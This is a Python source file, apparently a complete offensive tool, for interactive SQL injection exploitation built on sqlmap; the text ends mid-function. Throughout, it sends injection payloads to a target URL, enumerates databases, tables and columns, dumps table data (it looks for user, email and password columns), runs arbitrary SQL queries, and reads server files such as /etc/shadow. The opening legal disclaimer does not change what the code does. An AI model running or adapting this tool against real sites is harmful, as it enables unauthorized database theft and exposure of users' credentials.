#!/usr/bin/env python3
"""
============================================
          SQLi Hunter Pro (2025)
============================================

⚠️  IMPORTANT LEGAL WARNING ⚠️
This tool is for AUTHORIZED penetration testing and educational purposes ONLY.
Unauthorized access to computer systems is illegal and punishable by law.

Developer: Nasser AL-harbi 
Twitter: https://x.com/yyppv
Purpose: Interactive SQL Injection Exploitation
============================================
"""

import os
import sys
import re
import time
import shutil
import argparse
import subprocess
import signal
from datetime import datetime
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode
from typing import List, Dict, Tuple, Optional
import requests
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

class Colors:
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    CYAN = Fore.CYAN
    BLUE = Fore.BLUE
    MAGENTA = Fore.MAGENTA
    WHITE = Fore.WHITE
    RESET = Style.RESET_ALL

class InteractiveSQLiExploiter:
    """Interactive SQL Injection Exploitation Tool"""
    
    def __init__(self):
        self.version = "3.0"
        self.author = "Nasser AL-harbi (KSA)"
        self.twitter = "https://x.com/yyppv"
        
        # Configuration
        self.timeout = 20
        self.output_dir = Path(f"sql_interactive_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
        self.log_file = self.output_dir / "exploitation.log"
        self.session = requests.Session()
        
        # Target information
        self.target_url = ""
        self.base_url = ""
        self.params: Dict[str, str] = {}
        self.param_name = ""
        self.param_value = ""
        self.request_method = "GET"
        
        # State
        self.databases: List[str] = []
        self.current_db = ""
        self.tables: List[str] = []
        self.current_table = ""
        self.columns: List[str] = []
        self.selected_columns: List[str] = []
        self.extracted_data = []
        
        # Tools check
        self.sqlmap_available = self.check_sqlmap()
        
        self.setup_environment()
    
    def setup_environment(self):
        """Setup output directory and logging"""
        try:
            self.output_dir.mkdir(exist_ok=True, parents=True)
            print(f"{Colors.GREEN}[+] Created output directory: {self.output_dir}")
        except Exception as e:
            print(f"{Colors.RED}[-] Setup error: {e}")
            sys.exit(1)
    
    def check_sqlmap(self) -> bool:
        """Check if sqlmap is available"""
        try:
            result = subprocess.run(['which', 'sqlmap'], capture_output=True, text=True, timeout=5)
            return result.returncode == 0
        except:
            return False
    
    def print_banner(self):
        """Display professional banner"""
        print(f"{Colors.RED}")
        print(" ███████╗ ██████╗ ██╗     ██╗")
        print(" ██╔════╝██╔═══██╗██║     ██║")
        print(" ███████╗██║   ██║██║     ██║")
        print(" ╚════██║██║   ██║██║     ██║")
        print(" ███████║╚██████╔╝███████╗██║")
        print(" ╚══════╝ ╚═════╝ ╚══════╝╚═╝")
        print(f"{Colors.RED}      Developer: Nasser AL-harbi (KSA)")
        print(f"{Colors.CYAN}       Twitter: https://x.com/yyppv")
        print(f"{Colors.WHITE}   SQLi Hunter - SQL Injection Exploit v{self.version}")
        print(f"{Colors.RESET}")
        print("=" * 60)
        print(f"{Colors.YELLOW}⚠️  For Authorized Testing & Education Only ⚠️")
        print(f"{Colors.RESET}")
    
    def parse_target(self, url: str) -> Tuple[Dict[str, str], str, str]:
        """Parse target URL and extract parameters"""
        try:
            parsed = urlparse(url)
            self.base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            # Parse query parameters
            params = parse_qs(parsed.query)
            
            # Convert lists to single values
            simple_params = {key: value[0] if value else "" for key, value in params.items()}
            
            if simple_params:
                self.request_method = "GET"
                # Get first parameter for testing
                first_key = next(iter(simple_params), "")
                return simple_params, first_key, simple_params.get(first_key, "")
            else:
                self.request_method = "POST"
                return {}, "", ""
                
        except Exception as e:
            print(f"{Colors.RED}[-] Error parsing URL: {e}")
            return {}, "", ""
    
    def send_request(self, url: str, data: Optional[Dict] = None, 
                     method: str = "GET", timeout: int = 15) -> Optional[requests.Response]:
        """Send HTTP request with error handling"""
        try:
            # Disable SSL warnings for HTTPS
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            
            if method.upper() == "GET":
                response = self.session.get(url, timeout=timeout, verify=False)
            else:
                response = self.session.post(url, data=data, timeout=timeout, verify=False)
            
            return response
            
        except requests.exceptions.Timeout:
            print(f"{Colors.RED}[-] Request timeout")
            return None
        except requests.exceptions.RequestException as e:
            print(f"{Colors.RED}[-] Request error: {e}")
            return None
    
    def test_injection(self) -> bool:
        """Test for SQL injection vulnerabilities"""
        print(f"\n{Colors.YELLOW}[*] Testing for SQL Injection...")
        
        payloads = [
            "'",
            "\"",
            "' OR '1'='1",
            "' AND 1=2 UNION SELECT NULL -- ",
        ]
        
        injection_found = False
        
        for payload in payloads:
            if self.request_method == "GET":
                # Build test URL with payload
                test_params = self.params.copy()
                if self.param_name in test_params:
                    test_params[self.param_name] = test_params[self.param_name] + payload
                
                query_string = urlencode(test_params)
                test_url = f"{self.base_url}?{query_string}"
                
                print(f"{Colors.CYAN}[→] Testing: {test_url}")
                
                response = self.send_request(test_url, method="GET", timeout=self.timeout)
                
            else:  # POST
                test_data = {self.param_name: self.param_value + payload}
                print(f"{Colors.CYAN}[→] Testing POST with payload: {payload}")
                
                response = self.send_request(self.base_url, data=test_data, 
                                           method="POST", timeout=self.timeout)
            
            if response is None:
                continue
            
            # Check for SQL errors
            response_text = response.text.lower()
            
            error_patterns = [
                r'sql syntax',
                r'mysql_fetch',
                r'mysql_query',
                r'PostgreSQL',
                r'ODBC',
                r'PDO',
                r'SQLite',
                r'warning',
                r'error',
                r'exception',
                r'unclosed',
                r'mismatched',
            ]
            
            for pattern in error_patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    print(f"{Colors.GREEN}[✓] SQL Injection detected!")
                    print(f"    Payload: {payload}")
                    print(f"    Error: {pattern}")
                    injection_found = True
                    break
            
            if injection_found:
                break
            
            time.sleep(0.5)
        
        if injection_found:
            print(f"\n{Colors.GREEN}[+] SQL Injection vulnerability confirmed!")
            return True
        else:
            print(f"{Colors.RED}[-] No SQL Injection detected")
            return False
    
    def _build_base_cmd(self) -> List[str]:
        """Helper to build base sqlmap command for GET/POST"""
        if self.request_method == "GET":
            return ['sqlmap', '-u', self.target_url]
        else:
            post_data = urlencode(self.params) if self.params else f"{self.param_name}={self.param_value}"
            return ['sqlmap', '-u', self.base_url, '--data', post_data]
    
    def run_sqlmap_command(self, cmd: List[str], description: str = "") -> Tuple[str, str, Optional[Path]]:
        """Run sqlmap command and capture output"""
        print(f"\n{Colors.CYAN}[→] {description}")
        print(f"    Command: {' '.join(cmd)}")
        
        try:
            # Create unique output directory for this command
            timestamp = datetime.now().strftime("%H%M%S")
            output_dir = self.output_dir / f"sqlmap_{timestamp}"
            output_dir.mkdir(exist_ok=True, parents=True)
            
            # Add --output-dir to sqlmap
            if '--output-dir' not in cmd:
                cmd.insert(1, '--output-dir')
                cmd.insert(2, str(output_dir.resolve()))
            
            result = subprocess.run(cmd, capture_output=True, text=True, 
                                  timeout=900, cwd=str(output_dir))  # 15 mins for dump
            
            return result.stdout, result.stderr, output_dir
            
        except subprocess.TimeoutExpired:
            print(f"{Colors.RED}[-] Command timed out")
            return "", "Timeout", None
        except Exception as e:
            print(f"{Colors.RED}[-] Error running command: {e}")
            return "", str(e), None
    
    def extract_clean_list(self, text: str, item_type: str = "item") -> List[str]:
        """Extract clean list from sqlmap output, filtering out garbage (improved)"""
        items = []
        
        # Common patterns for valid database/table names
        valid_pattern = r'^[a-zA-Z_][a-zA-Z0-9_.-]*$'
        
        # First, try to find items in sqlmap output format
        patterns = [
            r'\[\*\]\s+([a-zA-Z_][a-zA-Z0-9_.-]*)',  # [*] item
            r'\[\+\]\s+([a-zA-Z_][a-zA-Z0-9_.-]*)',  # [+] item
            r'\|\s+([a-zA-Z_][a-zA-Z0-9_.-]*)\s+\|', # | item |
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, text)
            items.extend(matches)
        
        # If no items found with patterns, try to extract from lines
        if not items:
            lines = text.split('\n')
            for line in lines:
                line = line.strip()
                # Skip lines that are obviously not database/table names
                if (len(line) < 2 or len(line) > 64 or 
                    line.startswith('[') or 
                    line.startswith('--') or
                    line.startswith('available') or
                    line.startswith('Database:') or
                    line.startswith('Table:') or
                    'information_schema' in line or
                    'performance_schema' in line or
                    'mysql' in line or
                    'sys' in line or
                    'test' in line or
                    'level' in line.lower() or
                    'risk' in line.lower() or
                    'starting' in line.lower() or
                    'ending' in line.lower() or
                    'http' in line.lower() or
                    'https' in line.lower() or
                    'time' in line.lower() or
                    'sqlmap' in line.lower()):
                    continue
                
                # Check if it looks like a valid name
                if re.match(valid_pattern, line):
                    items.append(line)
        
        # Remove duplicates and sort
        items = list(set(items))
        items.sort()
        
        # Filter out any remaining garbage
        garbage_keywords = ['starting', 'ending', 'time', 'level', 'risk', 'payload']
        filtered_items = [item for item in items if not any(kw in item.lower() for kw in garbage_keywords) and 2 <= len(item) <= 64]
        
        return filtered_items
    
    def interactive_menu(self):
        """Main interactive menu"""
        while True:
            print(f"\n{Colors.CYAN}{'='*60}")
            print(f"{Colors.CYAN}            INTERACTIVE SQLi EXPLOITATION")
            print(f"{Colors.CYAN}{'='*60}")
            
            print(f"\n{Colors.YELLOW}[+] Current Target: {self.target_url}")
            print(f"{Colors.YELLOW}[+] Method: {self.request_method}")
            print(f"{Colors.YELLOW}[+] Parameter: {self.param_name}")
            
            print(f"\n{Colors.WHITE}    1. Enumerate Databases")
            print(f"    2. Select Database")
            print(f"    3. Enumerate Tables")
            print(f"    4. Select Table")
            print(f"    5. Enumerate Columns")
            print(f"    6. Select Columns")
            print(f"    7. Dump Table Data")
            print(f"    8. Custom SQL Query")
            print(f"    9. File Read Attempt")
            print(f"    10. View Extracted Data")
            print(f"    11. Change Target")
            print(f"    0. Exit")
            
            print(f"\n{Colors.CYAN}{'-'*40}")
            print(f"Current DB: {self.current_db or 'None'}")
            print(f"Current Table: {self.current_table or 'None'}")
            print(f"Tables Found: {len(self.tables)}")
            print(f"Columns Found: {len(self.columns)}")
            if self.selected_columns:
                print(f"Selected Columns: {', '.join(self.selected_columns)}")
            print(f"{Colors.CYAN}{'-'*40}")
            
            try:
                choice = input(f"\n{Colors.WHITE}>> Select option (0-11): ").strip()
                
                if choice == '0':
                    print(f"\n{Colors.GREEN}[+] Exiting...")
                    break
                elif choice == '1':
                    self.enumerate_databases()
                elif choice == '2':
                    self.select_database()
                elif choice == '3':
                    self.enumerate_tables()
                elif choice == '4':
                    self.select_table()
                elif choice == '5':
                    self.enumerate_columns()
                elif choice == '6':
                    self.select_columns()
                elif choice == '7':
                    self.dump_table_data()
                elif choice == '8':
                    self.custom_query()
                elif choice == '9':
                    self.file_read_attempt()
                elif choice == '10':
                    self.view_extracted_data()
                elif choice == '11':
                    self.change_target()
                else:
                    print(f"{Colors.RED}[-] Invalid choice")
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}[!] Operation cancelled")
                continue
            except Exception as e:
                print(f"{Colors.RED}[-] Error: {e}")
    
    def enumerate_databases(self):
        """Enumerate databases using sqlmap"""
        if not self.sqlmap_available:
            print(f"{Colors.RED}[-] sqlmap not installed")
            print(f"{Colors.YELLOW}[!] Install: sudo apt install sqlmap")
            return
        
        print(f"\n{Colors.YELLOW}[*] Enumerate databases...")
        
        cmd = self._build_base_cmd() + ['--dbs', '--batch', '--random-agent']
        
        stdout, stderr, output_dir = self.run_sqlmap_command(cmd, "Getting databases")
        
        self.databases = self.extract_clean_list(stdout, "database")
        
        if self.databases:
            print(f"\n{Colors.GREEN}[+] Found {len(self.databases)} databases:")
            for i, db in enumerate(self.databases, 1):
                print(f"{Colors.CYAN}    {i:2d}. {db}")
            
            # Save to file
            with open(self.output_dir / "databases.txt", 'w') as f:
                for db in self.databases:
                    f.write(f"{db}\n")
            print(f"{Colors.GREEN}[+] Saved to: {self.output_dir}/databases.txt")
        else:
            print(f"{Colors.RED}[-] No databases found")
            print(f"{Colors.YELLOW}[!] Raw output in {output_dir}")
    
    def select_database(self):
        """Select a database to work with"""
        if not self.databases:
            print(f"{Colors.YELLOW}[!] No databases enumerated yet. Use option 1 first.")
            return
        
        print(f"\n{Colors.YELLOW}[*] Available databases:")
        for i, db in enumerate(self.databases, 1):
            print(f"{Colors.CYAN}    {i:2d}. {db}")
        
        try:
            choice = input(f"\n{Colors.WHITE}>> Select database number (1-{len(self.databases)}): ").strip()
            index = int(choice) - 1
            
            if 0 <= index < len(self.databases):
                self.current_db = self.databases[index]
                print(f"{Colors.GREEN}[+] Selected database: {self.current_db}")
                # Clear previous
                self.tables = []
                self.current_table = ""
                self.columns = []
                self.selected_columns = []
            else:
                print(f"{Colors.RED}[-] Invalid selection")
                
        except (ValueError, IndexError):
            print(f"{Colors.RED}[-] Invalid input")
    
    def enumerate_tables(self):
        """Enumerate tables in current database"""
        if not self.current_db:
            print(f"{Colors.YELLOW}[!] No database selected. Use option 2 first.")
            return
        
        if not self.sqlmap_available:
            print(f"{Colors.RED}[-] sqlmap not installed")
            return
        
        print(f"\n{Colors.YELLOW}[*] Enumerating tables in database: {self.current_db}")
        
        cmd = self._build_base_cmd() + ['-D', self.current_db, '--tables', '--batch', '--random-agent']
        
        stdout, stderr, output_dir = self.run_sqlmap_command(cmd, "Getting tables")
        
        self.tables = self.extract_clean_list(stdout, "table")
        
        if self.tables:
            print(f"\n{Colors.GREEN}[+] Found {len(self.tables)} tables:")
            for i, table in enumerate(self.tables, 1):
                print(f"{Colors.CYAN}    {i:2d}. {table}")
            
            table_file = self.output_dir / f"{self.current_db}_tables.txt"
            with open(table_file, 'w') as f:
                for table in self.tables:
                    f.write(f"{table}\n")
            print(f"{Colors.GREEN}[+] Saved to: {table_file}")
        else:
            print(f"{Colors.RED}[-] No tables found")
    
    def select_table(self):
        """Select a table to work with"""
        if not self.tables:
            print(f"{Colors.YELLOW}[!] No tables enumerated yet. Use option 3 first.")
            return
        
        print(f"\n{Colors.YELLOW}[*] Available tables in {self.current_db}:")
        for i, table in enumerate(self.tables, 1):
            print(f"{Colors.CYAN}    {i:2d}. {table}")
        
        try:
            choice = input(f"\n{Colors.WHITE}>> Select table number (1-{len(self.tables)}): ").strip()
            index = int(choice) - 1
            
            if 0 <= index < len(self.tables):
                self.current_table = self.tables[index]
                print(f"{Colors.GREEN}[+] Selected table: {self.current_table}")
                # Clear previous column selection
                self.columns = []
                self.selected_columns = []
            else:
                print(f"{Colors.RED}[-] Invalid selection")
                
        except (ValueError, IndexError):
            print(f"{Colors.RED}[-] Invalid input")
    
    def enumerate_columns(self):
        """Enumerate columns in current table"""
        if not self.current_table:
            print(f"{Colors.YELLOW}[!] No table selected. Use option 4 first.")
            return
        
        if not self.sqlmap_available:
            print(f"{Colors.RED}[-] sqlmap not installed")
            return
        
        print(f"\n{Colors.YELLOW}[*] Enumerating columns in table: {self.current_db}.{self.current_table}")
        
        cmd = self._build_base_cmd() + ['-D', self.current_db, '-T', self.current_table, '--columns', '--batch', '--random-agent']
        
        stdout, stderr, output_dir = self.run_sqlmap_command(cmd, "Getting columns")
        
        self.columns = self.extract_clean_list(stdout, "column")
        
        if self.columns:
            print(f"\n{Colors.GREEN}[+] Found {len(self.columns)} columns:")
            for i, column in enumerate(self.columns, 1):
                print(f"{Colors.CYAN}    {i:2d}. {column}")
            
            column_file = self.output_dir / f"{self.current_db}_{self.current_table}_columns.txt"
            with open(column_file, 'w') as f:
                for column in self.columns:
                    f.write(f"{column}\n")
            print(f"{Colors.GREEN}[+] Saved to: {column_file}")
        else:
            print(f"{Colors.RED}[-] No columns found")
    
    def select_columns(self):
        """Select specific columns to dump"""
        if not self.columns:
            print(f"{Colors.YELLOW}[!] No columns enumerated yet. Use option 5 first.")
            return
        
        print(f"\n{Colors.YELLOW}[*] Available columns in {self.current_db}.{self.current_table}:")
        for i, col in enumerate(self.columns, 1):
            print(f"{Colors.CYAN}    {i:2d}. {col}")
        
        try:
            print(f"\n{Colors.CYAN}[?] Enter column numbers separated by commas (e.g., 1,3,5) or 'all':")
            choice = input(f"{Colors.WHITE}>> ").strip()
            
            if choice.lower() == 'all':
                self.selected_columns = self.columns
            else:
                indices = [int(x.strip()) - 1 for x in choice.split(',')]
                self.selected_columns = [self.columns[i] for i in indices if 0 <= i < len(self.columns)]
            
            if self.selected_columns:
                print(f"{Colors.GREEN}[+] Selected columns: {', '.join(self.selected_columns)}")
            else:
                print(f"{Colors.RED}[-] No valid columns selected.")
                self.selected_columns = []
                
        except (ValueError, IndexError):
            print(f"{Colors.RED}[-] Invalid input. Please enter valid numbers.")
            self.selected_columns = []
    
    def dump_table_data(self):
        """Dump data from current table (with selected columns if any) - FIXED VERSION"""
        if not self.current_table:
            print(f"{Colors.YELLOW}[!] No table selected. Use option 4 first.")
            return

        if not self.sqlmap_available:
            print(f"{Colors.RED}[-] sqlmap not installed")
            return

        # Determine columns to dump
        columns_to_dump = self.selected_columns if self.selected_columns else None

        print(f"\n{Colors.YELLOW}[*] Dumping data from table: {self.current_db}.{self.current_table}")
        if columns_to_dump:
            print(f"{Colors.CYAN}[+] Dumping only columns: {', '.join(columns_to_dump)}")

        # Ask for limit
        limit = input(f"{Colors.CYAN}[?] Number of rows to dump? (Enter for all): ").strip()

        # Build sqlmap command
        cmd = self._build_base_cmd() + ['-D', self.current_db, '-T', self.current_table]

        if columns_to_dump:
            cmd.extend(['-C', ','.join(columns_to_dump)])

        cmd.extend(['--dump', '--batch'])

        if limit and limit.isdigit():
            cmd.extend(['--stop', limit])

        stdout, stderr, output_dir = self.run_sqlmap_command(cmd, "Dumping table data")

        # Parse and display data from stdout - IMPROVED PARSING
        if stdout:
            lines = stdout.split('\n')
            
            # Filter only the actual data table from sqlmap output
            data_section_started = False
            table_found = False
            table_data = []
            headers = []
            
            # First, let's find the actual data table
            for i, line in enumerate(lines):
                stripped = line.strip()
                
                # Look for the data table header
                if not data_section_started and '---' in stripped and i > 0:
                    # Check if previous line might be column headers
                    prev_line = lines[i-1].strip() if i > 0 else ""
                    if '|' in prev_line and any(col in prev_line.lower() for col in ['id', 'name', 'user', 'email', 'pass', 'pwd']):
                        data_section_started = True
                        table_found = True
                        # Extract headers from previous line
                        headers = [h.strip() for h in prev_line.split('|') if h.strip()]
                        continue
                
                # Once we're in the data section, collect data rows
                if data_section_started:
                    if stripped and '|' in stripped and not stripped.startswith('+') and '---' not in stripped:
                        # This is a data row
                        cells = [cell.strip() for cell in stripped.split('|') if cell.strip()]
                        if cells and len(cells) >= len(headers) if headers else True:
                            table_data.append(cells)
                    elif stripped.startswith('+') or '...' in stripped or 'fetched' in stripped:
                        # End of data section
                        break
            
            # If table not found with above method, try alternative parsing
            if not table_found or not table_data:
                table_data = []
                headers = []
                
                # Look for specific patterns in the output
                for i, line in enumerate(lines):
                    stripped = line.strip()
                    
                    # Skip sqlmap metadata and progress messages
                    if any(pattern in stripped.lower() for pattern in [
                        '[info]', '[warning]', '[critical]', 'current status',
                        'sqlmap', 'starting', 'ending', 'fetched', '...'
                    ]):
                        continue
                    
                    # Skip lines that are clearly not data
                    if len(stripped) < 3 or stripped.startswith('--'):
                        continue
                    
                    # Look for data rows (with our selected column names)
                    if columns_to_dump:
                        # Check if line contains our column names
                        has_columns = any(col.lower() in stripped.lower() for col in columns_to_dump)
                        if has_columns and '|' in stripped:
                            # This might be a header row
                            cells = [cell.strip() for cell in stripped.split('|') if cell.strip()]
                            if cells:
                                headers = cells
                                continue
                    
                    # Look for actual data rows
                    if '|' in stripped and not stripped.startswith('+'):
                        cells = [cell.strip() for cell in stripped.split('|') if cell.strip()]
                        if cells:
                            # Filter out rows that look like metadata
                            is_data_row = True
                            for cell in cells:
                                if any(meta in cell.lower() for meta in [
                                    'info', 'warning', 'current', 'status', 'sqlmap'
                                ]):
                                    is_data_row = False
                                    break
                            
                            if is_data_row and len(cells) > 1:
                                # Check if this might be a duplicate header
                                if not headers or cells != headers:
                                    table_data.append(cells)
            
            # Final cleanup: Remove any rows that look like headers from data
            clean_data = []
            for row in table_data:
                # Skip rows that are likely headers (contain column names)
                if headers and row == headers:
                    continue
                
                # Skip rows that contain sqlmap metadata
                has_metadata = False
                for cell in row:
                    if any(meta in str(cell).lower() for meta in [
                        'info', 'warning', 'current', 'status', 'sqlmap', '...'
                    ]):
                        has_metadata = True
                        break
                
                if not has_metadata:
                    clean_data.append(row)
            
            # Use clean data
            table_data = clean_data
            
            # If we have data but no headers, create generic headers
            if table_data and not headers:
                headers = [f'Column {i+1}' for i in range(len(table_data[0]))]
            
            # Filter data to match header count
            if headers and table_data:
                filtered_data = []
                for row in table_data:
                    if len(row) == len(headers):
                        filtered_data.append(row)
                    elif len(row) > len(headers):
                        filtered_data.append(row[:len(headers)])  # Truncate extra columns
                table_data = filtered_data
            
            # Display the data
            if table_data:
                print(f"\n{Colors.GREEN}[✓] Extracted {len(table_data)} clean row(s):")
                
                # Calculate column widths
                col_widths = [len(str(h)) for h in headers] if headers else [15] * len(table_data[0])
                
                # Update widths based on all data including headers
                all_rows = [headers] if headers else []
                all_rows.extend(table_data)
                
                for row in all_rows:
                    for i, cell in enumerate(row):
                        if i < len(col_widths):
                            col_widths[i] = max(col_widths[i], len(str(cell)))
                
                # Add padding
                col_widths = [w + 2 for w in col_widths]
                
                # Create and display border
                border = "+"
                for width in col_widths:
                    border += "-" * width + "+"
                
                print(f"{Colors.CYAN}{border}")
                
                # Display headers
                if headers:
                    header_str = "|"
                    for i, header in enumerate(headers):
                        header_str += f" {header:<{col_widths[i]}}|"
                    print(f"{Colors.YELLOW}{header_str}")
                    print(f"{Colors.CYAN}{border}")
                
                # Display data rows
                for row in table_data:
                    row_str = "|"
                    for i, cell in enumerate(row):
                        if i < len(col_widths):
                            row_str += f" {str(cell):<{col_widths[i]}}|"
                        else:
                            row_str += f" {str(cell)} |"
                    print(f"{Colors.WHITE}{row_str}")
                
                # Display bottom border
                print(f"{Colors.CYAN}{border}")
                
                # Show data sample
                print(f"\n{Colors.CYAN}[*] Data sample:")
                for i, row in enumerate(table_data[:3]):
                    display_row = []
                    for j, cell in enumerate(row):
                        if headers and j < len(headers):
                            display_row.append(f"{headers[j]}: {cell}")
                        else:
                            display_row.append(f"Col{j+1}: {cell}")
                    print(f"{Colors.WHITE}  Row {i+1}: {', '.join(display_row)}")
                
                if len(table_data) > 3:
                    print(f"{Colors.CYAN}  ... and {len(table_data) - 3} more rows")
                
                # Save to CSV file
                filename = f"{self.current_db}_{self.current_table}_data.csv"
                dump_file = self.output_dir / filename
                
                with open(dump_file, 'w', encoding='utf-8') as f:
                    # Write headers
                    if headers:
                        f.write(','.join(f'"{h}"' if ',' in str(h) else str(h) for h in headers) + '\n')
                    
                    # Write data
                    for row in table_data:
                        escaped_row = []
                        for cell in row:
                            cell_str = str(cell)
                            if ',' in cell_str or '"' in cell_str:
                                cell_str = cell_str.replace('"', '""')
                                cell_str = f'"{cell_str}"'
                            escaped_row.append(cell_str)
                        f.write(','.join(escaped_row) + '\n')
                
                print(f"{Colors.GREEN}[+] Clean data saved to: {dump_file}")

                # Track extracted data
                self.extracted_data.append({
                    'database': self.current_db,
                    'table': self.current_table,
                    'columns': columns_to_dump or "ALL",
                    'file': str(dump_file),
                    'rows': len(table_data),
                    'headers': headers,
                    'sample': table_data[:3] if table_data else []
                })
            else:
                print(f"{Colors.RED}[-] No clean data extracted.")
                print(f"{Colors.YELLOW}[!] Showing raw sqlmap output analysis:")
                
                # Analyze the raw output
                print(f"{Colors.CYAN}" + "="*80)
                print(f"{Colors.YELLOW}Raw output analysis:")
                
                found_sections = []
                for i, line in enumerate(lines):
                    stripped = line.strip()
                    if stripped and len(stripped) > 10:
                        # Check what type of line this is
                        if '|' in stripped:
                            parts = [p.strip() for p in stripped.split('|') if p.strip()]
                            if len(parts) >= 2:
                                found_sections.append(f"Line {i+1}: Table-like data ({len(parts)} columns)")
                                print(f"{Colors.CYAN}  Line {i+1}: {stripped[:80]}...")
                        elif any(keyword in stripped.lower() for keyword in ['email', 'pwd', 'uname', 'password', 'username']):
                            found_sections.append(f"Line {i+1}: Contains column names")
                            print(f"{Colors.GREEN}  Line {i+1}: {stripped}")
                
                print(f"{Colors.CYAN}" + "="*80)
                print(f"{Colors.YELLOW}Summary: Found {len(found_sections)} potential data sections")
                for section in found_sections:
                    print(f"  {section}")
                
                print(f"{Colors.YELLOW}[!] Check full output in: {output_dir}")
        else:
            print(f"{Colors.RED}[-] No output from sqlmap.")
    
    def custom_query(self):
        """Execute custom SQL query"""
        if not self.sqlmap_available:
            print(f"{Colors.RED}[-] sqlmap not installed")
            return
        
        print(f"\n{Colors.YELLOW}[*] Custom SQL Query")
        print(f"{Colors.CYAN}[?] Enter SQL query (without quotes):")
        query = input(f"{Colors.WHITE}>> ").strip()
        
        if not query:
            print(f"{Colors.RED}[-] No query provided")
            return
        
        # Build sqlmap command
        cmd = self._build_base_cmd() + ['--sql-query', query, '--batch', '--random-agent']
        
        stdout, stderr, output_dir = self.run_sqlmap_command(cmd, f"Executing: {query}")
        
        # Save output
        if stdout:
            query_file = self.output_dir / f"custom_query_{datetime.now().strftime('%H%M%S')}.txt"
            with open(query_file, 'w') as f:
                f.write(f"Query: {query}\n\n")
                f.write(stdout)
            print(f"{Colors.GREEN}[+] Output saved to: {query_file}")
            
            # Show interesting parts
            lines = stdout.split('\n')
            for line in lines:
                if line.strip() and not line.startswith('[') and not line.startswith('--'):
                    print(f"{Colors.CYAN}    {line}")
    
    def file_read_attempt(self):
        """Attempt to read files from the server"""
        if not self.sqlmap_available:
            print(f"{Colors.RED}[-] sqlmap not installed")
            return
        
        print(f"\n{Colors.YELLOW}[*] File Read Attempt")
        print(f"{Colors.CYAN}[?] Enter file path to read:")
        file_path = input(f"{Colors.WHITE}>> ").strip()
        
        if not file_path:
            # Suggest common files
            print(f"\n{Colors.CYAN}Common files to try:")
            print(f"    /etc/passwd")
            print(f"    /etc/shadow")
            print(f"    /etc/hosts")
            print(f"    C:/Windows/System32/drivers/etc/hosts")
            file_path = input(f"\n{Colors.WHITE}>> Enter file path: ").strip()
        
        if not file_path:
            print(f"{Colors.RED}[-] No file path provided")
            return
        
        # Build sqlmap command
        cmd = self._build_base_cmd() + ['--file-read', file_path, '--batch', '--random-agent']
        
        stdout, stderr, output_dir = self.run_sqlmap_command(cmd, f"Reading: {file_path}")
        
        # Check if file was read
        if 'retrieved' in stdout.lower() or 'read' in stdout.lower():
            print(f"{Colors.GREEN}[✓] File retrieved successfully!")
            
            # Find the retrieved file
            if output_dir:
                for file in output_dir.rglob("*"):
                    if Path(file_path).name in file.name or file_path.replace('/', '_') in file.name:
                        target_file = self.output_dir / Path(file_path).name
                        try:
                            shutil.copy(file, target_file)
                            print(f"{Colors.GREEN}[+] File saved to: {target_file}")
                            
                            # Show first few lines
                            try:
                                with open(target_file, 'r', encoding='utf-8', errors='ignore') as f:
                                    lines = []
                                    for _ in range(10):
                                        try:
                                            lines.append(next(f).strip())
                                        except StopIteration:
                                            break
                                
                                if lines:
                                    print(f"\n{Colors.CYAN}First {len(lines)} lines:")
                                    for line in lines:
                                        if len(line) > 100:
                                            line = line[:97] + "..."
                                        print(f"{Colors.WHITE}    {line}")
                            except Exception as e:
                                print(f"{Colors.YELLOW}[!] Could not read file: {e}")
                                
                        except Exception as e:
                            print(f"{Colors.RED}[-] Error copying file: {e}")
                        break
        else:
            print(f"{Colors.RED}[-] Could not read file")
    
    def view_extracted_data(self):
        """View all extracted data"""
        if not self.extracted_data:
            print(f"{Colors.YELLOW}[!] No data extracted yet")
            return
        
        print(f"\n{Colors.YELLOW}[*] Extracted Data Summary")
        print(f"{Colors.CYAN}{'-'*50}")
        
        for i, data in enumerate(self.extracted_data, 1):
            print(f"{Colors.GREEN}[{i}] {data['database']}.{data['table']}")
            print(f"{Colors.CYAN}    File: {data['file']}")
            print(f"{Colors.CYAN}    Columns: {', '.join(data['columns']) if isinstance(data['columns'], list) else data['columns']}")
            print(f"{Colors.CYAN}    Rows: {data['rows']}")
            print(f"{Colors.CYAN}{'-'*30}")
    
    def change_target(self):
        """Change target URL"""
        print(f"\n{Colors.YELLOW}[*] Change Target")
        new_url = input(f"{Colors.WHITE}>> Enter new target URL: ").strip()
        
        if new_url:
            self.target_url = new_url
            self.params, self.param_name, self.param_value = self.parse_target(new_url)
            
            # Reset state
            self.databases = []
            self.current_db = ""
            self.tables = []
            self.current_table = ""
            self.columns = []
            self.selected_columns = []
            self.extracted_data = []
            
            print(f"{Colors.GREEN}[+] Target changed to: {new_url}")
            
            # Test new target
            self.test_injection()
        else:
            print(f"{Colors.RED}[-] No URL provided")
    
    def run(self):
        """Main execution function"""
        self.print_banner()
        
        # Get target URL
        print(f"\n{Colors.CYAN}[?] Enter target information")
        print()
        
        self.target_url = input(f"{Colors.WHITE}>> Target URL (with parameter if GET): ").strip()
        
        if not self.target_url:
            print(f"{Colors.RED}[-] Target URL is required")
            sys.exit(1)
        
        # Parse target
        self.params, self.param_name, self.param_value = self.parse_target(self.target_url)
        
        if self.request_method == "POST" and (not self.param_name or not self.param_value):
            print(f"{Colors.YELLOW}[?] Assuming POST request")
            self.param_name = input(f"{Colors.WHITE}>> POST parameter name: ").strip()
            self.param_value = input(f"{Colors.WHITE}>> POST parameter value: ").strip()
            
            if not self.param_name or not self.param_value:
                print(f"{Colors.RED}[-] Both parameter name and value are required")
                sys.exit(1)
        
        print(f"\n{Colors.GREEN}[+] Target: {self.target_url}")
        print(f"{Colors.GREEN}[+] Method: {self.request_method}")
        print(f"{Colors.GREEN}[+] Parameter: {self.param_name}")
        
        # Test for injection
        if not self.test_injection():
            print(f"\n{Colors.YELLOW}[!] No SQL injection detected, but you can still try manual exploitation")
            proceed = input(f"{Colors.CYAN}[?] Continue anyway? (y/n): ").strip().lower()
            if proceed != 'y':
                return
        
        # Check for sqlmap
        if not self.sqlmap_available:
